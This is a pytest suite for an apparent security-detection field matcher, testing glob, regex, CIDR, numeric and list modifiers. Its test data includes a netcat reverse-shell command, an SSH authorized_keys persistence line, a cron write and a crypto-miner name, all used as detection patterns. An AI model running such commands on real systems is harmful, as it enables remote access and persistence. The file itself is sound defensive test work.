"""Field matcher tests covering every supported modifier."""

from __future__ import annotations

import pytest

from argus.match import (
    FieldMatcher,
    MatchError,
    compile_pattern,
    glob_to_regex,
    split_field_expression,
)


def _match(expression: str, value, raw):
    return FieldMatcher.build(expression, value).matches_value(raw)


def test_split_field_expression():
    assert split_field_expression("user") == ("user", None)
    assert split_field_expression("command|CONTAINS") == ("command", "contains")
    assert split_field_expression("src_ip|cidr") == ("src_ip", "cidr")


@pytest.mark.parametrize("expression", ["", "  ", "|contains", "a|b|c", "user|nope"])
def test_split_field_expression_rejects_invalid_input(expression):
    with pytest.raises(MatchError):
        split_field_expression(expression)


def test_exact_matching_is_case_insensitive_by_default():
    assert _match("user", "Deploy", "deploy")
    assert _match("user", "deploy", "DEPLOY")
    assert not _match("user", "deploy", "root")
    assert _match("user|contains", "PLOY", "deploy")


def test_glob_matching_for_star_and_question_mark():
    assert _match("command", "/bin/*", "/bin/bash -c id")
    assert _match("command", "xmri?", "xmrig")
    assert not _match("command", "xmri?", "xmrigg")
    assert _match("command", "*cron*", "echo 1 > /etc/cron.d/x")
    regex = glob_to_regex("/bin/*")
    assert regex.match("/bin/sh")
    assert not regex.match("prefix /bin/sh")


def test_contains_startswith_endswith_modifiers():
    assert _match("command|contains", "authorized_keys", "echo x >> /home/a/.ssh/authorized_keys")
    assert _match("command|startswith", "/usr/bin", "/usr/bin/apt-get install x")
    assert not _match("command|startswith", "apt-get", "/usr/bin/apt-get install x")
    assert not _match("path|endswith", ".sh", "http://host/tools/x.sh?download=1")
    assert _match("path|endswith", ".sh", "x.sh")


def test_regex_modifier_uses_search_and_case_insensitivity():
    assert _match("command|re", r"\bnc\b.*-e", "nc -e /bin/sh 1.2.3.4 4444")
    assert _match("command|re", r"(?i)bash\s+-i", "BASH -I")
    with pytest.raises(MatchError):
        FieldMatcher.build("command|re", "(")


def test_cidr_modifier_supports_v4_v6_and_invalid_input():
    matcher = FieldMatcher.build("src_ip|cidr", "10.0.0.0/8")
    assert matcher.matches_value("10.1.2.3")
    assert not matcher.matches_value("192.168.1.2")
    assert not matcher.matches_value("not-an-ip")
    assert not matcher.matches_value(None)
    matcher = FieldMatcher.build("src_ip|cidr", "2001:db8::/32")
    assert matcher.matches_value("2001:db8::5")
    assert not matcher.matches_value("10.1.2.3")
    with pytest.raises(MatchError):
        FieldMatcher.build("src_ip|cidr", "not-a-network")


def test_numeric_modifiers_compare_integers_floats_and_strings():
    assert _match("bytes_out|gt", 100, 101)
    assert not _match("bytes_out|gt", 100, 100)
    assert _match("bytes_out|gte", 100, "100")
    assert _match("bytes_out|lt", 100, 99.5)
    assert _match("bytes_out|lte", 100, "100")
    assert not _match("bytes_out|lt", 100, "unknown")
    with pytest.raises(MatchError):
        FieldMatcher.build("bytes_out|gt", "many")


def test_exists_modifier_distinguishes_missing_and_empty_strings():
    matcher = FieldMatcher.build("command|exists", True)
    assert matcher.matches_value("/bin/sh")
    assert matcher.matches_value("")
    assert not matcher.matches_value(None)


def test_in_modifier_matches_list_membership():
    assert _match("action|in", ["ssh_auth_failed", "ssh_auth_success"], "ssh_auth_failed")
    assert not _match("action|in", ["ssh_auth_failed"], "sudo_command")


def test_list_values_are_or_ed_and_list_fields_match_any_element():
    matcher = FieldMatcher.build("action", ["ssh_auth_failed", "ssh_auth_success"])
    assert matcher.matches_value("ssh_auth_success")
    assert matcher.matches_value(["sudo_command", "ssh_auth_failed"])
    assert not matcher.matches_value(["sudo_command"])


@pytest.mark.parametrize(
    "value",
    [None, [], {"nested": 1}],
)
def test_invalid_matcher_values_are_rejected(value):
    with pytest.raises(MatchError):
        FieldMatcher.build("field", value)


def test_pattern_length_guards():
    with pytest.raises(MatchError):
        compile_pattern("*" * 1100, None, False)
    with pytest.raises(MatchError):
        compile_pattern("x" * 1100, "re", False)


def test_describe_includes_field_modifier_and_value():
    assert FieldMatcher.build("user", "root").describe() == "user=root"
    assert FieldMatcher.build("src_ip|cidr", "10.0.0.0/8").describe() == "src_ip|cidr=10.0.0.0/8"
    assert FieldMatcher.build("action", ["a", "b"]).describe() == "action=['a', 'b']"
